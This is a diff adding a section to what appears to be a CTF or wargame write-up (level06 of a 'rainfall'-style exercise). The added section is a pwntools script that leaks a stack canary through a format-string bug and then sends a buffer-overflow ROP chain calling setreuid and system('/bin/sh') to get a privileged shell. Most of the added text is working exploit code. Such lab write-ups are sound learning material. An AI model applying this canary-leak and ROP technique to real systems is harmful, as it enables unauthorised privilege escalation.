@@ -95,3 +95,34 @@ level06@rainfall:~$ python3 -c 'import sys; sys.stdout.buffer.write(b"%p "*20)' 
 ```
 
 The purpose here is to find the canary value, then use it in the payload to bypass the canary check, and then use a rop chain as we proviously did to spawn a shell with correct uid.
+
+
+
+=--=
+```python
+from pwn import *
+
+elf = context.binary = ELF('./3jane')
+p = process('./3jane')
+
+p.sendlineafter(b'Request ID: ', b'%15$p')
+p.recvuntil(b'Logging: ')
+rep = p.recvline().strip()
+rep_int = int(rep, 16)
+
+payload = b"A" * 136
+payload += p64(rep_int)
+payload += b"A" * 8
+payload += p64(0x7ffff7d0c08d)   # pop rdi ; ret
+payload += p64(1023)             # uid de flag05
+payload += p64(0x7ffff7d10b7d)   # pop rsi ; ret
+payload += p64(1023)             # uid de flag05
+payload += p64(0x7ffff7d27370)   # setreuid
+payload += p64(0x7ffff7d0c08d)   # pop rdi ; ret
+payload += p64(0x7ffff7dcc42f)   # "/bin/sh"
+payload += p64(0x7ffff7c58750)   # system
+
+p.sendlineafter(b'Access code: ', payload)
+
+p.interactive()                  # to stay in stdin (like (...; cat) |)
+```
